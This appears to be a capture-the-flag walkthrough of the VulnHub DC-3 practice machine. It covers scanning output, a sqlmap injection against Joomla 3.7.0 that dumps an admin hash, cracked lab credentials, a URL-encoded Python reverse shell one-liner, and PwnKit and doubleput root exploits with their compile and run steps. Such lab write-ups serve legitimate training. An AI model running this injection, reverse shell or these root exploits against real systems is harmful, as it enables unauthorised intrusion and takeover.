# BOX NAME: DC-3
**LINK**: https://www.vulnhub.com/entry/dc-32,312/

<details open><summary><ins>SUMMARY</ins></summary>

```
1. Sqlmap the database.
2. Log in and manipulate template files to get reverse shell.
3. either use doubleput or pwnkit exploit.
4. get root!

had some issues with the sqlmap output of the databases. the #__users table returned with a # sign and could thus not be retrieved.
I researched, got onto the box, and with rootcreds checked the DB manually. there the database name was d8...__users. Weird.

Fun with some kernel exploits though. Nice there was more than two. 
```
</details>

# REMOTE ENUMERATION:

<details><summary><ins>TARGET</ins></summary>

```
[+] IP:		10.77.0.63
[+] URL:	http://dc.local or http://dc-3
```
</details>
<details><summary><ins>NMAP</ins></summary>

```
└─$ nmap -sV -sC $IP -oN nmap-dc3.log
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-30 20:31 CEST
Nmap scan report for dc.local (10.77.0.64)
Host is up (0.00027s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Home
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-generator: Joomla! - Open Source Content Management

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.96 seconds

```
</details>
<details><summary><ins>WEB</ins></summary>

whatweb-scan

```
└─$ whatweb $URL --log-verbose=whatweb-dc3.log --follow-redirect=always
http://dc-3/ [200 OK] Apache[2.4.18], Bootstrap, Cookies[460ada11b31d3c5e5ca6e58fd5d3de27], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], HttpOnly[460ada11b31d3c5e5ca6e58fd5d3de27], IP[10.77.0.64], JQuery, MetaGenerator[Joomla! - Open Source Content Management], PasswordField[password], Script[application/json], Title[Home]

```

nikto-scan

```
└─$ nikto -h $URL | tee nikto-dc3.log
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.77.0.64
+ Target Hostname:    dc-3
+ Target Port:        80
+ Start Time:         2023-04-30 20:31:45 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /images: IP address found in the 'location' header. The IP is "127.0.1.1". See: https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed
+ /images: The web server may reveal its internal or real IP in the Location header via a request to with HTTP/1.0. The value is "127.0.1.1". See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /: DEBUG HTTP verb may show server debugging information. See: https://docs.microsoft.com/en-us/visualstudio/debugger/how-to-enable-debugging-for-aspnet-applications?view=vs-2017
+ /index.php?module=ew_filemanager&type=admin&func=manager&pathext=../../../etc: EW FileManager for PostNuke allows arbitrary file retrieval. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2047
+ /administrator/: This might be interesting.
+ /bin/: This might be interesting.
+ /includes/: This might be interesting.
+ /tmp/: This might be interesting.
+ /LICENSE.txt: License file found may identify site software.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /htaccess.txt: Default Joomla! htaccess.txt file found. This should be removed or renamed.
+ /administrator/index.php: Admin login page/section found.                                                                         
+ 8658 requests: 0 error(s) and 16 item(s) reported on remote host                                                                  
+ End Time:           2023-04-30 20:32:13 (GMT2) (28 seconds)                                                                                             
---------------------------------------------------------------------------                                                                               
+ 1 host(s) tested
```

fuzzing

```

```
cmseek
```
 ___ _  _ ____ ____ ____ _  _
|    |\/| [__  |___ |___ |_/  by @r3dhax0r
|___ |  | ___| |___ |___ | \_ Version 1.1.3 K-RONA


 [+]  Deep Scan Results  [+] 

[✔] Target: http://dc-3
[✔] Detected CMS: Joomla
[✔] CMS URL: https://joomla.org
[✔] Joomla Version: 3.7.0
[✔] Readme file: http://dc-3/README.txt
[✔] Admin URL: http://dc-3administrator


[✔] Open directories: 4
[*] Open directory url: 
   [>] http://dc-3administrator/templates
   [>] http://dc-3images/banners
   [>] http://dc-3administrator/modules
   [>] http://dc-3administrator/components

```
Joomscan
```
    ____  _____  _____  __  __  ___   ___    __    _  _ 
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
                        (1337.today)
   
    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://dc-3 ...

[+] FireWall Detector
[++] Firewall not detected
[+] Detecting Joomla Version
[++] Joomla 3.7.0
[+] Core Joomla Vulnerability                                                                                                                                                                                    
[++] Target Joomla core is not vulnerable                                                                                                                                                                        
                                                                                                                                                                                                              
[+] Checking Directory Listing                                                                                                                                                                                   
[++] directory has directory listing :                                                                                                                                                                           
http://dc-3/administrator/components                                                                                                                                                                             
http://dc-3/administrator/modules                                                                                                                                                                                
http://dc-3/administrator/templates                                                                                                                                                                              
http://dc-3/images/banners                                                                                                                                                                                                                                                                                                                                                                                    
                                                                                                                                                                                                              
[+] Checking apache info/status files                                                                                                                                                                            
[++] Readable info/status files are not found                                                                                                                                                                    
                                                                                                                                                                                                              
[+] admin finder                                                                                                                                                                                                 
[++] Admin page : http://dc-3/administrator/                                                                                                                                                                     
                                                                                                                                                                                                              
[+] Checking robots.txt existing                                                                                                                                                                                 
[++] robots.txt is not found                                                                                                                                                                                     
                                                                                                                                                                                                              
[+] Finding common backup files name                                                                                                                                                                             
[++] Backup files are not found                                                                                                                                                                                  
                                                                                                                                                                                                                                         
[+] Finding common log files name                                                                                                                                                                                                           
[++] error log is not found                                                                                                                                                                                                                 
                                                                                                                                                                                                                                         
[+] Checking sensitive config.php.x file                                                                                                                                                                                                                                    
[++] Readable config files are not found                                                                                                                                                                                                                                     
                                                                                                                                                                                                                                   
Your Report : reports/dc-3/   
└─$ SC joomla 3.7.0                            
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                                                                                                          |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Joomla! 3.7.0 - 'com_fields' SQL Injection                                                                                                                                                                                                                                              | php/webapps/42033.txt
Joomla! Component Easydiscuss < 4.0.21 - Cross-Site Scripting                                                                                                                                                                                                                           | php/webapps/43488.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------
``` 
other

```
Welcome to DC-3.
This time, there is only one flag, one entry point and no clues.
To get the flag, you'll obviously have to gain root privileges.
How you get to be root is up to you - and, obviously, the system.
Good luck - and I hope you enjoy this little challenge.  :-)
```
sqlmap
```
└─$ sqlmap -u "http://dc-3/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] --batch
available databases [5]:
[*] information_schema
[*] joomladb
[*] mysql
[*] performance_schema
[*] sys

└─$ sqlmap -u "http://dc-3/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb --tables -p list[fullordering] --batch
─$ sqlmap -u "http://dc-3/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T d8uea_users --batch --dump
**note the "d8uea_users". The pund sign character gets converted wierdly**

select * from d8uea_users;                                                                                                                                                                                                                  
+-----+-------+----------+--------------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+----------------------------------------------------------------------------------------------+---------------------+------------+--------+------+--------------+
| id  | name  | username | email                    | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                       | lastResetTime       | resetCount | otpKey | otep | requireReset |
+-----+-------+----------+--------------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+----------------------------------------------------------------------------------------------+---------------------+------------+--------+------+--------------+
| 629 | admin | admin    | freddy@norealaddress.net | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu |     0 |         1 | 2019-03-23 09:44:38 | 2023-04-30 19:12:17 | 0          | {"admin_style":"","admin_language":"","language":"","editor":"","helpsite":"","timezone":""} | 0000-00-00 00:00:00 |          0 |        |      |            0 |
+-----+-------+----------+--------------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+----------------------------------------------------------------------------------------------+---------------------+------------+--------+------+--------------+
```
SUMMARY
```
Enumerated box shows joomla-version 3.7.0. Vulnerable to sql injection like above. Dump the DB and get admin creds.
Log-in, manipulate index.php template to achieve code execution. Reverse shell.

%2Fusr%2Fbin%2Fpython%20-c%20%27import%20os%2Cpty%2Csocket%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28%2210.77.0.35%22%2C5555%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bpty.spawn%28%22%2Fbin%2Fbash%22%29%27
```
</details>
<details><summary><ins>OTHER</ins></summary>

</details>


# LOCAL ENUMERATION:

<details><summary><ins>FILES OF INTEREST</ins></summary>

**FILES**:
```
/usr/bin/pkexec
```

**SUID's**:

```
/bin/ping6
/bin/ntfs-3g
/bin/umount
/bin/su
/bin/fusermount
/bin/mount
/bin/ping
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/i386-linux-gnu/lxc/lxc-user-nic
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/passwd
/usr/bin/newgidmap
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newuidmap
/usr/bin/newgrp
/usr/bin/at
```
**SGID's**:

```
/sbin/unix_chkpwd
/sbin/pam_extrausers_chkpwd
/usr/lib/snapd/snap-confine
/usr/lib/i386-linux-gnu/utempter/utempter
/usr/bin/chage
/usr/bin/ssh-agent
/usr/bin/bsd-write
/usr/bin/screen
/usr/bin/crontab
/usr/bin/wall
/usr/bin/expiry
/usr/bin/mlocate
/usr/bin/at

```
**OTHERS**:

```

```
</details>

<details><summary><ins>USEFUL INFORMATION:</ins></summary>

**Kernel Info:**
*file /bin/bash ; echo -e " \\n" && lsb_release -a ; echo -e "\\n" && uname -a*

```
/bin/bash: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib, for GNU/Linux 2.6.32, BuildID[sha1]=1d878a5214eef416ceb5ee0c4f537fb9b417daf8, stripped
 

No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 16.04 LTS
Release:        16.04
Codename:       xenial


Linux DC-3 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux
```
</details>

<details><summary><ins>CREDS:</ins></summary>

```
username:password

admin:snoopy

        public $user = 'root';
        public $password = 'squires';
        public $db = 'joomladb';
```
``` 
[4 entries]
+-----------+------------------+-----------------------+----------+-----------+-----------+------------+------------+------------+------------+------------+------------+-------------+-------------+-------------+-------------+-------------+-------------+-------------+-------------+--------------+--------------+--------------+--------------+--------------+---------------+---------------+----------------+----------------+-----------------+-----------------+-----------------+------------------+------------------+------------------+------------------+------------------+-------------------+--------------------+---------------------+----------------------+-----------------------+-------------------------------------------+-----------------------+------------------------+
| Host      | User             | plugin                | ssl_type | Drop_priv | File_priv | Alter_priv | Event_priv | Grant_priv | Index_priv | Super_priv | ssl_cipher | Create_priv | Delete_priv | Insert_priv | Reload_priv | Select_priv | Update_priv | max_updates | x509_issuer | Execute_priv | Process_priv | Show_db_priv | Trigger_priv | x509_subject | Shutdown_priv | max_questions | Show_view_priv | account_locked | References_priv | Repl_slave_priv | max_connections | Create_user_priv | Create_view_priv | Lock_tables_priv | Repl_client_priv | password_expired | password_lifetime | Alter_routine_priv | Create_routine_priv | max_user_connections | Create_tmp_table_priv | authentication_string                     | password_last_changed | Create_tablespace_priv |
+-----------+------------------+-----------------------+----------+-----------+-----------+------------+------------+------------+------------+------------+------------+-------------+-------------+-------------+-------------+-------------+-------------+-------------+-------------+--------------+--------------+--------------+--------------+--------------+---------------+---------------+----------------+----------------+-----------------+-----------------+-----------------+------------------+------------------+------------------+------------------+------------------+-------------------+--------------------+---------------------+----------------------+-----------------------+-------------------------------------------+-----------------------+------------------------+
| localhost | debian-sys-maint | mysql_native_password | <blank>  | Y         | Y         | Y          | Y          | Y          | Y          | Y          | <blank>    | Y           | Y           | Y           | Y           | Y           | Y           | 0           | <blank>     | Y            | Y            | Y            | Y            | <blank>      | Y             | 0             | Y              | N              | Y               | Y               | 0               | Y                | Y                | Y                | Y                | N                | NULL              | Y                  | Y                   | 0                    | Y                     | *0640482736E7906211AEA47971B6C8478BA7DB4D | 2019-03-23 19:16:41   | Y                      |
| localhost | mysql.session    | mysql_native_password | <blank>  | N         | N         | N          | N          | N          | N          | Y          | <blank>    | N           | N           | N           | N           | N           | N           | 0           | <blank>     | N            | N            | N            | N            | <blank>      | N             | 0             | N              | Y              | N               | N               | 0               | N                | N                | N                | N                | N                | NULL              | N                  | N                   | 0                    | N                     | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE | 2019-03-25 13:47:42   | N                      |
| localhost | mysql.sys        | mysql_native_password | <blank>  | Y         | Y         | Y          | Y          | Y          | Y          | Y          | <blank>    | Y           | Y           | Y           | Y           | Y           | Y           | 0           | <blank>     | Y            | Y            | Y            | Y            | <blank>      | Y             | 0             | Y              | N              | Y               | Y               | 0               | Y                | Y                | Y                | Y                | N                | NULL              | Y                  | Y                   | 0                    | Y                     | *0640482736E7906211AEA47971B6C8478BA7DB4D | 2019-03-23 19:16:41   | Y                      |
| localhost | root             | mysql_native_password | <blank>  | N         | N         | N          | N          | N          | N          | Y          | <blank>    | N           | N           | N           | N           | N           | N           | 0           | <blank>     | N            | N            | N            | N            | <blank>      | N             | 0             | N              | Y              | N               | N               | 0               | N                | N                | N                | N                | N                | NULL              | N                  | N                   | 0                    | N                     | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE | 2019-03-25 13:47:42   | N                      |
+-----------+------------------+-----------------------+----------+-----------+-----------+------------+------------+------------+------------+------------+------------+-------------+-------------+-------------+-------------+-------------+-------------+-------------+-------------+--------------+--------------+--------------+--------------+--------------+---------------+---------------+----------------+----------------+-----------------+-----------------+-----------------+------------------+------------------+------------------+------------------+------------------+-------------------+--------------------+---------------------+----------------------+-----------------------+-------------------------------------------+-----------------------+------------------------+

``` 
</details>

<details><summary><ins>HASHES:</ins></summary>

```

```
</details>

# Proofs

<details><summary><ins>Proofs</ins></summary>

Final payload:
```
# PwnKit (CVE-2021-4034) \\
cd /base/exploits/linux/kernel ; python3 -m http.server
gcc -shared pwnkit.c -o pwn -Wl,-e,entry -fPIC
./pwn

#wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip
tar xvf exploit.tar
./compile.sh

www-data@DC-3:/tmp/ebpf_mapfd_doubleput_exploit$ ./doubleput 
starting writev
woohoo, got pointer reuse
writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.

suid file detected, launching rootshell...
we have root privs now...
root@DC-3:/tmp/ebpf_mapfd_doubleput_exploit# 
```
```
 __        __   _ _   ____                   _ _ _ _ 
 \ \      / /__| | | |  _ \  ___  _ __   ___| | | | |
  \ \ /\ / / _ \ | | | | | |/ _ \| '_ \ / _ \ | | | |
   \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|
    \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)
                                                     

Congratulations are in order.  :-)
I hope you've enjoyed this challenge as I enjoyed making it.
If there are any ways that I can improve these little challenges,
please let me know.
As per usual, comments and complaints can be sent via Twitter to @DCAU7
Have a great day!!!!
```
</details>